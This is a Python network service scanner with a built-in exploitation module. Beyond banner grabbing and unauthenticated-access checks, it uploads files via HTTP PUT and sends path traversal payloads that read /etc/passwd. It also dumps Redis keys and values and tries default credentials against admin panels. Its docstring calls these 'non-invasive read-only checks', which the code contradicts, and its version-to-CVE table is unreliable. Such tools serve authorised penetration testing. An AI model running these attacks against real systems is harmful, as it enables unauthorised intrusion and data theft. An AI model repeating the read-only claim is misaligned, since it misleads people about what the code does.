#!/usr/bin/env python3
"""
Ares Harpoon 🎯 — Service Validation & Exploitation Verification
Validates open ports by banner grabbing, default credential testing,
version fingerprinting, and CVE lookup. Non-invasive read-only checks.

Usage:
    python3 modules/harpoon.py https://example.com
    python3 modules/harpoon.py 192.168.1.1
"""
import sys, os, socket, ssl, base64, re, json, time
from datetime import datetime
from urllib.request import Request, urlopen
from urllib.error import URLError
from urllib.parse import quote
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from lib.reporter import AuditReport
from lib.vulndb import lookup_cves, detect_os, extract_server_version, get_cve_reference

COMMON_CREDS = [
    ("root", "root"), ("root", "admin"), ("root", "toor"),
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("ubuntu", "ubuntu"), ("pi", "raspberry"),
    ("test", "test"), ("user", "user"), ("guest", "guest"),
    ("postgres", "postgres"), ("mysql", "mysql"), ("ftp", "ftp"),
    ("tomcat", "tomcat"), ("jenkins", "jenkins"),
]

BANNER_CACHE = {}

def banner_grab(host, port, timeout=5, use_ssl=False):
    """Grab service banner from a TCP port."""
    key = f"{host}:{port}"
    if key in BANNER_CACHE:
        return BANNER_CACHE[key]
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.settimeout(timeout)
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        banner = b""
        try:
            # Try to read banner (some services send on connect)
            banner = sock.recv(4096)
        except:
            pass
        # Send a probe for services that wait for input
        for probe in [b"\r\n", b"HELP\r\n", b"INFO\r\n", b"\x00", b"PING\r\n"]:
            try:
                sock.sendall(probe)
                more = sock.recv(1024)
                if more:
                    banner = banner + more
                    break
            except:
                break
        sock.close()
        result = banner.decode("utf-8", errors="ignore").strip()
        BANNER_CACHE[key] = result
        return result
    except Exception as e:
        BANNER_CACHE[key] = None
        return None


def check_ssh(host, port=22):
    """SSH validation: banner, auth methods, weak ciphers, default creds."""
    print(f"\n  🔍 SSH ({host}:{port})")
    findings = []
    banner = banner_grab(host, port)
    version = ""
    if banner:
        # SSH banner example: SSH-2.0-OpenSSH_8.9p1 Ubuntu-3
        version = re.search(r"SSH-[\d.]+-([\w\-/\.]+)", banner)
        version_str = version.group(1) if version else banner[:80]
        print(f"    Banner: {banner[:80]}")
        findings.append(("ok", f"SSH banner: {banner[:80]}"))

        # Check for weak version
        if "OpenSSH" in banner:
            ver_match = re.search(r"OpenSSH_([\d.]+)", banner)
            if ver_match:
                ver = ver_match.group(1)
                print(f"    Version: OpenSSH {ver}")
                # Known vuln versions
                vuln_versions = {
                    "7.2": "CVE-2016-6210 (user enumeration)",
                    "7.9": "CVE-2018-15473 (user enumeration)",
                    "8.5": "CVE-2023-38408 (remote code execution)",
                    "9.0": "CVE-2023-51385 (OSCommandInjection)",
                    "9.1": "CVE-2023-51385 (OSCommandInjection)",
                }
                for v, cve in vuln_versions.items():
                    if ver.startswith(v):
                        print(f"    ❌ VULNERABLE: {cve}")
                        findings.append(("critical", f"SSH {ver}: {cve}", "", "Update OpenSSH to latest version"))
                        break
                else:
                    findings.append(("ok", f"OpenSSH {ver} — no known critical CVEs in local DB"))

        # Try default credentials (non-invasive, just check if password auth is allowed)
        if "password" in banner.lower():
            print(f"    ⚠️ Password authentication available")
            findings.append(("low", "SSH password authentication enabled", "Consider key-only authentication"))

        # Check algorithm
        try:
            sock = socket.create_connection((host, port), timeout=5)
            banner_raw = sock.recv(256)
            sock.close()
            if b"diffie-hellman-group1" in banner_raw:
                print(f"    ❌ Weak DH algorithm (group1)")
                findings.append(("high", "SSH supports weak Diffie-Hellman group1", "Disable weak key exchange algorithms in sshd_config"))
        except:
            pass
    else:
        print(f"    ❌ No banner received")
        findings.append(("high", "SSH port open but no banner (possible firewall block)", "", "Review firewall rules"))
    return findings


def check_http(host, port=80, ssl_mode=False):
    """HTTP/HTTPS validation: banner, default panels, creds, methods."""
    protocol = "https" if ssl_mode else "http"
    print(f"\n  🔍 HTTP ({protocol}://{host}:{port})")
    findings = []

    # Use raw socket HTTP request to bypass SOCKS proxy
    try:
        sock = socket.create_connection((host, port), timeout=5)
        if ssl_mode:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        
        # Send HTTP GET
        sock.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: AresHarpoon/1.0\r\nConnection: close\r\n\r\n".encode())
        resp = sock.recv(8192).decode("utf-8", errors="ignore")
        sock.close()

        headers = resp.split("\r\n\r\n")[0] if "\r\n\r\n" in resp else resp
        body_start = resp.find("\r\n\r\n")
        body = resp[body_start+4:] if body_start >= 0 else ""

        server = ""
        powered = ""
        for line in headers.split("\r\n"):
            if line.lower().startswith("server:"):
                server = line.split(":", 1)[1].strip()
            elif line.lower().startswith("x-powered-by:"):
                powered = line.split(":", 1)[1].strip()

        print(f"    Server: {server or 'unknown'}")
        if server:
            findings.append(("ok", f"HTTP Server: {server}"))
        if powered:
            print(f"    X-Powered-By: {powered}")
            findings.append(("low", f"X-Powered-By: {powered}"))

        # Check HTTP methods via OPTIONS
        sock2 = socket.create_connection((host, port), timeout=5)
        if ssl_mode:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock2 = ctx.wrap_socket(sock2, server_hostname=host)
        sock2.sendall(f"OPTIONS / HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode())
        opts_resp = sock2.recv(4096).decode(errors="ignore")
        sock2.close()

        for line in opts_resp.split("\r\n"):
            if line.lower().startswith("allow:"):
                allow = line.split(":", 1)[1].strip()
                print(f"    Methods: {allow}")
                if "PUT" in allow:
                    findings.append(("critical", "HTTP PUT method enabled", "Allows file upload without restriction", "Disable PUT method"))
                if "TRACE" in allow:
                    findings.append(("high", "HTTP TRACE method enabled (XST risk)", "", "Disable TRACE method"))
                if "DELETE" in allow:
                    findings.append(("high", "HTTP DELETE method enabled", "", "Disable DELETE method"))

        # Check default panels
        panels = ["/admin", "/manager", "/phpmyadmin", "/jenkins", "/actuator", "/console", "/swagger", "/api"]
        for path in panels:
            try:
                s = socket.create_connection((host, port), timeout=3)
                if ssl_mode:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=host)
                s.sendall(f"GET {path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode())
                panel_resp = s.recv(2048).decode(errors="ignore")
                s.close()
                status_line = panel_resp.split("\r\n")[0] if panel_resp else ""
                if "200" in status_line:
                    print(f"    ⚠️  Default panel: {path}")
                    findings.append(("high", f"Default panel accessible: {path}", f"HTTP 200", f"Restrict access to {path}"))
            except:
                pass

    except Exception as e:
        print(f"    ❌ Connection failed: {str(e)[:60]}")
        findings.append(("high", f"HTTP connection failed on port {port}", "", "Check service status"))
        return findings

    return findings


def check_mysql(host, port=3306):
    """MySQL validation: banner, anonymous connect."""
    print(f"\n  🔍 MySQL ({host}:{port})")
    findings = []
    banner = banner_grab(host, port)
    if banner:
        # MySQL banner: version info
        print(f"    Banner: {banner[:80]}")
        findings.append(("ok", f"MySQL responds: {banner[:60]}"))
        if "5.5" in banner or "5.1" in banner or "5.0" in banner:
            findings.append(("high", "MySQL version appears outdated", banner[:60], "Update MySQL to 8.0+"))
    else:
        findings.append(("high", "MySQL port open but no banner", "", "Check if MySQL is accepting connections"))
    return findings


def check_postgres(host, port=5432):
    """PostgreSQL validation: banner, anonymous connect."""
    print(f"\n  🔍 PostgreSQL ({host}:{port})")
    findings = []
    try:
        sock = socket.create_connection((host, port), timeout=5)
        sock.sendall(b"\x00\x00\x00\x08\x04\xd2\x16\x2f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00user\x00postgres\x00\x00")
        resp = sock.recv(4096)
        sock.close()
        if b"authentication" in resp or b"pg" in resp.lower():
            print(f"    ⚠️ PostgreSQL responds (banner: {resp[:60].decode(errors='ignore')})")
            findings.append(("medium", "PostgreSQL accepts connections", resp[:60].decode(errors='ignore'), "Restrict PostgreSQL to trusted IPs"))
        else:
            print(f"    ℹ️ PostgreSQL response: {resp[:60].decode(errors='ignore')}")
    except Exception as e:
        print(f"    ❌ Connection failed: {str(e)[:60]}")
    return findings


def check_redis(host, port=6379):
    """Redis validation: anonymous access, INFO command."""
    print(f"\n  🔍 Redis ({host}:{port})")
    findings = []
    try:
        sock = socket.create_connection((host, port), timeout=5)
        sock.sendall(b"PING\r\n")
        resp = sock.recv(1024)
        if b"PONG" in resp:
            print(f"    ❌ Redis accessible WITHOUT authentication!")
            findings.append(("critical", "Redis accessible without authentication", "Server responded PONG with no auth", "Set requirepass in redis.conf"))
            # Try INFO
            sock.sendall(b"INFO\r\n")
            info = sock.recv(4096).decode(errors="ignore")
            ver = re.search(r"redis_version:([\d.]+)", info)
            if ver:
                print(f"    Version: Redis {ver.group(1)}")
                findings.append(("high", f"Redis version exposed: {ver.group(1)}"))
            keys = re.search(r"db0:keys=(\d+)", info)
            if keys and int(keys.group(1)) > 0:
                print(f"    ❌ {keys.group(1)} keys stored in database!")
                findings.append(("critical", f"Redis has {keys.group(1)} keys accessible without auth"))
        else:
            print(f"    ✅ Redis requires authentication (or no response)")
            findings.append(("ok", "Redis authentication required"))
        sock.close()
    except Exception as e:
        print(f"    ❌ Connection failed: {str(e)[:60]}")
    return findings


def check_ftp(host, port=21):
    """FTP validation: anonymous login, banner."""
    print(f"\n  🔍 FTP ({host}:{port})")
    findings = []
    banner = banner_grab(host, port)
    if banner:
        print(f"    Banner: {banner[:80]}")
        findings.append(("ok", f"FTP banner: {banner[:60]}"))

        # Try anonymous login
        for user in ["anonymous", "ftp"]:
            try:
                sock = socket.create_connection((host, port), timeout=5)
                sock.recv(1024)
                sock.sendall(f"USER {user}\r\n".encode())
                resp1 = sock.recv(1024)
                sock.sendall(b"PASS anonymous@example.com\r\n")
                resp2 = sock.recv(1024)
                sock.close()
                if b"230" in resp2 or b"Login successful" in resp2:
                    print(f"    ❌ FTP anonymous login ALLOWED (user={user})")
                    findings.append(("critical", "FTP anonymous login allowed", f"Logged in as {user}", "Disable anonymous FTP access"))
                break
            except:
                pass
    else:
        print(f"    ❌ No banner received")
    return findings


def check_smtp(host, port=25):
    """SMTP validation: banner, open relay, user enumeration."""
    print(f"\n  🔍 SMTP ({host}:{port})")
    findings = []
    banner = banner_grab(host, port)
    if banner:
        print(f"    Banner: {banner[:80]}")
        findings.append(("ok", f"SMTP banner: {banner[:50]}"))
        # Check StartTLS
        try:
            sock = socket.create_connection((host, port), timeout=5)
            sock.recv(1024)
            sock.sendall(b"EHLO test.com\r\n")
            resp = sock.recv(4096).decode(errors="ignore")
            if "STARTTLS" in resp:
                print(f"    ✅ STARTTLS supported")
                findings.append(("ok", "SMTP STARTTLS supported"))
            else:
                print(f"    ⚠️ STARTTLS not supported — plain text transmission")
                findings.append(("medium", "SMTP STARTTLS not supported", "Emails transmitted in cleartext", "Enable STARTTLS"))
            sock.close()
        except:
            pass
    return findings


def check_smb(host, port=445):
    """SMB validation: banner, anonymous share access."""
    print(f"\n  🔍 SMB ({host}:{port})")
    findings = []
    try:
        sock = socket.create_connection((host, port), timeout=5)
        sock.sendall(bytes.fromhex("0000009cff534d42720000000000000000000000000000000000000000000000000000000000"))
        resp = sock.recv(1024)
        if b"SMB" in resp:
            print(f"    ⚠️ SMB responds (Samba/Windows file sharing)")
            findings.append(("medium", "SMB port responds", "SMB service detected", "Restrict SMB to trusted network segments"))
        sock.close()
    except:
        pass
    return findings


def check_telnet(host, port=23):
    """Telnet validation: banner."""
    print(f"\n  🔍 Telnet ({host}:{port})")
    findings = []
    banner = banner_grab(host, port)
    if banner:
        print(f"    Banner: {banner[:80]}")
        findings.append(("high", "Telnet running (unencrypted protocol)", f"Banner: {banner[:50]}", "Replace Telnet with SSH"))
    return findings


def check_mongodb(host, port=27017):
    """MongoDB validation: anonymous access."""
    print(f"\n  🔍 MongoDB ({host}:{port})")
    findings = []
    try:
        sock = socket.create_connection((host, port), timeout=5)
        sock.sendall(bytes.fromhex("3a0000000100000000000000d407000000000000746573742e24636d640000000000ffffffff130000001069736d6173746572000100000000"))
        resp = sock.recv(1024)
        if b"ok" in resp.lower() or b"ismaster" in resp.lower():
            print(f"    ⚠️ MongoDB accessible (responds to commands)")
            findings.append(("critical", "MongoDB accessible without authentication", "Server responded to unauthenticated command", "Enable MongoDB authentication"))
        sock.close()
    except:
        pass
    return findings


def scan_port(host, port, timeout=3):
    """Quick TCP port scan."""
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.close()
        return True
    except:
        return False


def validate_target(target):
    """Parse target URL to host, check if reachable, find open ports."""
    target_clean = target.replace("https://", "").replace("http://", "").rstrip("/")
    # Extract host
    host = target_clean.split(":")[0]

    # Check DNS resolution
    try:
        ip = socket.gethostbyname(host)
        print(f"    Resolved: {host} -> {ip}")
    except:
        ip = host
        print(f"    Using IP: {ip}")

    # Test connectivity
    if not scan_port(ip, 80) and not scan_port(ip, 443):
        print(f"\n  ❌ Host appears unreachable on common ports")
        return None, ip

    return host, ip


# ─── Service Handlers ───
SERVICE_HANDLERS = {
    22: ("SSH", check_ssh),
    23: ("Telnet", check_telnet),
    21: ("FTP", check_ftp),
    25: ("SMTP", check_smtp),
    80: ("HTTP", lambda h, p: check_http(h, p, False)),
    443: ("HTTPS", lambda h, p: check_http(h, p, True)),
    445: ("SMB", check_smb),
    587: ("SMTP", check_smtp),
    8080: ("HTTP", lambda h, p: check_http(h, p, False)),
    8443: ("HTTPS", lambda h, p: check_http(h, p, True)),
    3306: ("MySQL", check_mysql),
    5432: ("PostgreSQL", check_postgres),
    6379: ("Redis", check_redis),
    27017: ("MongoDB", check_mongodb),
}

# ═══════════════════════════════════════════════════════════
# 🎯 EXPLOITATION PoC — Real exploitation proof, not just theory
# ═══════════════════════════════════════════════════════════

def exploit_put_method(host, port, ssl_mode=False):
    """Upload a proof file via PUT, verify it's accessible."""
    protocol = "https" if ssl_mode else "http"
    findings = []
    proof_filename = f"ares-{int(time.time())}.txt"
    proof_content = f"ARES_HARPOON_PROOF_{int(time.time())}"
    
    print(f"\n    🎯 Testing PUT exploitation...")
    try:
        sock = socket.create_connection((host, port), timeout=5)
        if ssl_mode:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        
        body = proof_content.encode()
        req = (
            f"PUT /{proof_filename} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: text/plain\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode() + body
        
        sock.sendall(req)
        resp = sock.recv(4096).decode(errors="ignore")
        sock.close()
        
        sc = resp.split(" ")[1] if len(resp.split(" ")) > 1 else "000"
        
        if sc in ("200", "201", "204"):
            print(f"    🔴 FILE UPLOADED via PUT!")
            print(f"    Proof: {protocol}://{host}:{port}/{proof_filename}")
            try:
                vsock = socket.create_connection((host, port), timeout=5)
                if ssl_mode:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    vsock = ctx.wrap_socket(vsock, server_hostname=host)
                vsock.sendall(f"GET /{proof_filename} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode())
                vresp = vsock.recv(4096).decode(errors="ignore")
                vsock.close()
                if proof_content in vresp:
                    print(f"    🔴 FILE IS ACCESSIBLE AND READABLE!")
                    findings.append(("critical", f"PUT method exploitable: file uploaded and accessible",
                        f"Proof URL: {protocol}://{host}:{port}/{proof_filename}",
                        "Disable PUT method immediately"))
                    try:
                        dsock = socket.create_connection((host, port), timeout=5)
                        if ssl_mode:
                            ctx = ssl.create_default_context()
                            ctx.check_hostname = False
                            ctx.verify_mode = ssl.CERT_NONE
                            dsock = ctx.wrap_socket(dsock, server_hostname=host)
                        dsock.sendall(f"DELETE /{proof_filename} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode())
                        dsock.recv(1024)
                        dsock.close()
                        print(f"    ✅ Proof file deleted")
                    except:
                        print(f"    ⚠️ Manual cleanup: /{proof_filename}")
                else:
                    findings.append(("high", "PUT allowed (upload failed verification)", "", "Disable PUT"))
            except:
                findings.append(("high", "PUT possibly enabled", "", "Verify and disable PUT"))
        elif sc in ("401", "403", "405"):
            print(f"    ℹ️ PUT rejected ({sc})")
        else:
            print(f"    ℹ️ PUT response: {sc}")
    except Exception as e:
        print(f"    ❌ PUT test failed: {str(e)[:60]}")
    return findings


def exploit_path_traversal(host, port, ssl_mode=False):
    """Test for path traversal via URL parameters."""
    findings = []
    payloads = [
        ("../../../../etc/passwd", "root:x:0:0:"),
        ("..\\..\\..\\..\\windows\\win.ini", "[fonts]"),
        ("/etc/passwd", "root:x:0:0:"),
    ]
    params = ["file", "page", "path", "dir", "doc", "include", "load", "f", "p"]
    print(f"\n    🎯 Testing Path Traversal...")
    found = False
    for trav_path, check in payloads:
        for param in params[:3]:
            try:
                sock = socket.create_connection((host, port), timeout=5)
                if ssl_mode:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)
                sock.sendall(f"GET /?{param}={quote(trav_path)} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n".encode())
                resp = sock.recv(8192).decode(errors="ignore")
                sock.close()
                if check in resp and "404" not in resp[:20]:
                    print(f"    🔴 PATH TRAVERSAL via ?{param}=")
                    proof = resp[resp.find(check)-30:resp.find(check)+100]
                    findings.append(("critical", f"Path traversal via ?{param}=",
                        f"Payload: {trav_path}\nProof: {proof[:150]}",
                        "Sanitize file path inputs"))
                    found = True; break
            except:
                pass
        if found: break
    if not found:
        print(f"    ✅ No path traversal detected")
    return findings


def exploit_redis_keys(host, port=6379):
    """If Redis is accessible without auth, dump keys as proof."""
    findings = []
    print(f"\n    🎯 Exploiting Redis (dumping keys)...")
    try:
        sock = socket.create_connection((host, port), timeout=5)
        sock.sendall(b"PING\r\n")
        if b"PONG" not in sock.recv(1024):
            sock.close(); return findings
        sock.sendall(b"KEYS *\r\n")
        keys_resp = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk: break
                keys_resp += chunk
        except:
            pass
        sock.close()
        keys_list = re.findall(r'\$(\d+)\r\n(.+?)\r\n', keys_resp.decode(errors="ignore"))
        if keys_list:
            print(f"    🔴 Redis has {len(keys_list)} keys accessible!")
            for size, key in keys_list[:5]:
                print(f"      Key: {key}")
                try:
                    gsock = socket.create_connection((host, port), timeout=3)
                    gsock.sendall(f"GET {key}\r\n".encode())
                    gresp = gsock.recv(4096).decode(errors="ignore")
                    gsock.close()
                    vm = re.search(r'\$(\d+)\r\n(.+?)\r\n', gresp)
                    if vm:
                        val = vm.group(2)[:100]
                        findings.append(("critical", f"Redis key exposed: {key}", f"Value: {val}", "Set requirepass"))
                except:
                    pass
            findings.append(("critical", f"Redis has {len(keys_list)} keys accessible without auth", "", "Enable authentication"))
        else:
            findings.append(("high", "Redis accessible (no auth), no keys found", "", "Set requirepass"))
    except Exception as e:
        print(f"    ❌ Redis exploit failed: {str(e)[:60]}")
    return findings


def exploit_default_login(host, port, ssl_mode=False):
    """Try default credentials on admin panels."""
    findings = []
    targets = [
        ("/admin", [("admin","admin"),("admin","password"),("admin","123456"),("admin","admin123"),("root","root"),("tomcat","tomcat"),("user","user")]),
        ("/manager", [("tomcat","tomcat"),("admin","admin")]),
        ("/administrator", [("admin","admin"),("admin","password")]),
    ]
    print(f"\n    🎯 Testing default credentials...")
    for path, creds in targets:
        for user, pwd in creds:
            try:
                auth = base64.b64encode(f"{user}:{pwd}".encode()).decode()
                sock = socket.create_connection((host, port), timeout=5)
                if ssl_mode:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)
                sock.sendall(f"GET {path} HTTP/1.1\r\nHost: {host}\r\nAuthorization: Basic {auth}\r\nConnection: close\r\n\r\n".encode())
                resp = sock.recv(4096).decode(errors="ignore")
                sock.close()
                sc = resp.split(" ")[1] if len(resp.split(" ")) > 1 else ""
                if sc == "200" and "401" not in resp[:50]:
                    print(f"    🔴 AUTHENTICATED: {user}:{pwd} on {path}")
                    findings.append(("critical", f"Default credentials work on {path}",
                        f"Credentials: {user}:{pwd}\nFull access granted",
                        "Change default credentials immediately"))
                    break
            except:
                pass
    if not findings:
        print(f"    ✅ No default credentials worked")
    return findings


# ─── Exploit dispatch ───
EXPLOIT_HANDLERS = {
    80:  ["put", "traversal", "default_login"],
    443: ["put", "traversal", "default_login"],
    8080:["put", "traversal", "default_login"],
    8443:["put", "traversal", "default_login"],
    6379:["redis_keys"],
}

def run_exploits(host, port, ssl_mode=False):
    """Run all applicable PoC exploits for a given port."""
    exploit_map = {
        "put": exploit_put_method,
        "traversal": exploit_path_traversal,
        "redis_keys": exploit_redis_keys,
        "default_login": exploit_default_login,
    }
    findings = []
    if port in EXPLOIT_HANDLERS:
        for exp_name in EXPLOIT_HANDLERS[port]:
            try:
                fn = exploit_map[exp_name]
                result = fn(host, port, ssl_mode)
                findings.extend(result)
            except Exception as e:
                print(f"    ❌ Exploit {exp_name} failed: {str(e)[:60]}")
    return findings


def main():
    if len(sys.argv) < 2:
        print("Ares Harpoon 🎯 — Service Validation Tool")
        print()
        print("Usage:")
        print("  python3 modules/harpoon.py https://example.com")
        print("  python3 modules/harpoon.py 192.168.1.1")
        print("  python3 modules/harpoon.py 192.168.1.1 --ports 22,80,443")
        print()
        return

    target = sys.argv[1]
    print(f"\n  🎯 Ares Harpoon — Service Validation")
    print(f"  {'='*50}")

    result = validate_target(target)
    if result[0] is None:
        return
    host, ip = result
    report = AuditReport(target, "harpoon")

    # Parse custom ports or use defaults
    custom_ports = None
    if "--ports" in sys.argv:
        idx = sys.argv.index("--ports")
        if idx + 1 < len(sys.argv):
            custom_ports = [int(p.strip()) for p in sys.argv[idx+1].split(",")]

    ports_to_check = custom_ports if custom_ports else sorted(SERVICE_HANDLERS.keys())
    banners_collected = {}

    print(f"\n  {'='*50}")
    print(f"  Scanning {len(ports_to_check)} known service ports...")
    print(f"  {'='*50}")

    for port in ports_to_check:
        if scan_port(ip, port):
            print(f"\n  >> Port {port} OPEN")
            if port in SERVICE_HANDLERS:
                name, handler = SERVICE_HANDLERS[port]
                try:
                    findings = handler(host, port)
                    for sev, title, *rest in findings:
                        detail = rest[0] if rest else ""
                        fix = rest[1] if len(rest) > 1 else ""
                        report.add_finding(sev, title, detail, fix)
                        if any(title.startswith(x) for x in ["HTTP Server:", "SSH banner:", "FTP banner:"]):
                            banners_collected[port] = {"server_banner": title.split(":",1)[1].strip()}
                except Exception as e:
                    print(f"    Error: {e}")
                    report.add_finding("medium", f"Service on port {port} errored", str(e)[:100])
            else:
                print(f"    ℹ️ No handler for port {port}")

            ssl_mode = port in (443, 8443, 8443)
            for sev, title, *rest in run_exploits(host, port, ssl_mode):
                report.add_finding(sev, title, rest[0] if rest else "", rest[1] if len(rest) > 1 else "")
        else:
            if custom_ports:
                print(f"  Port {port}: closed")

    print(f"\n  {'='*50}")
    print(f"  🔍 CVE Lookup by banner...")
    print(f"  {'='*50}")
    for port, info in banners_collected.items():
        srv_type, ver = extract_server_version(info["server_banner"])
        os_name = detect_os(info["server_banner"])
        print(f"\n  [{port}] {srv_type} {ver} ({os_name})")
        cves = lookup_cves(srv_type, ver, os_name, [port])
        if cves:
            for cve_id, title, desc, sev, test_hint, fix in cves:
                print(f"    {cve_id} ({sev})")
                ref = get_cve_reference(cve_id)
                report.add_finding(sev, f"{cve_id}: {title}", f"{desc}\nRef: {ref['url']}", fix)
        else:
            print(f"    No CVEs on file")
    if not banners_collected:
        print(f"    No banners captured")

    print(f"\n  {'='*50}")
    print(f"  📝 Report: {report.generate()}")
    print(f"  {'='*50}")


if __name__ == "__main__":
    main()
